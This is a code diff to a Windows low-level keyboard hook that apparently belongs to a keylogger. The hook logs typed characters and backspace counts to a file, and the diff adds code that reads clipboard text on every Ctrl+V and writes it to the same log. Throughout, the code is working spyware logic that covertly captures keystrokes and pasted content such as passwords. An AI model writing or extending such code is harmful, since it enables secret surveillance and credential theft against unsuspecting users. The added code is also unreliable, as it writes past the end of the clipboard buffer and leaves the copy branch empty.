@@ -82,16 +82,45 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             if (SHIFT_key) {
                 buf[count_char++] = c; //to upper
             }
-            else if (CTRL_key && key == 0x43) {//ctrl+c 
-                wchar_t str[] = L"COPY:\n";
-                wchar_t copy_str = Computer.Clipboard.GetText();
-                save_in_file(str);
+            else if (CTRL_key && key == 0x43) {//ctrl+c  ctrl+x
+                if (OpenClipboard(NULL)) {
+                   
+
+
+                }
+                CloseClipboard();
+
             }//copy here________________________
+
+            //=================================
             else if (CTRL_key && key == 0x56) {//ctrl+v
-                wchar_t str[] = L"PASTE:\n";
-                buff paste
-                save_in_file(str);
+
+                if (OpenClipboard(NULL)) {
+                    wchar_t str[] = L"[PASTE]: ";
+
+                    wchar_t* paste_buf = (wchar_t*)GetClipboardData(CF_UNICODETEXT);
+                    if (paste_buf == NULL) {
+                        CloseClipboard();
+                        return CallNextHookEx(NULL, nCode, wParam, lParam);
+                    }
+                    unsigned int length = wcslen(paste_buf);
+                    if (length > 0) {
+                        if (count_char > 0) {
+                            save_in_file(buf);
+                            count_char = 0;
+                        }
+                        save_in_file(str);
+                        paste_buf[length] = '\n';
+                        paste_buf[length + 1] = '\0';
+                        save_in_file(paste_buf);
+                    }
+
+
+                }
+                CloseClipboard();
+
             }//paste here________________________
+
             else buf[count_char++] = c + 0x20;//to lower
             uni_c = 0;
             if (back_space > 1) {
@@ -99,7 +128,7 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
 
 
                 wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
+                const  wchar_t* num = space_num.c_str();
                 wcscat_s(str, num);
                 wchar_t ab[] = L"\n";
                 wcscat_s(str, ab);
@@ -107,8 +136,11 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
 
                 back_space = 0;
             }
-           
         }//end a-z
+
+            //=============================================
+            
+
 
         if (key >= 0x30 && key <= 0x39) {//encouter 1-9 is not numlock
             wchar_t c = L' ';
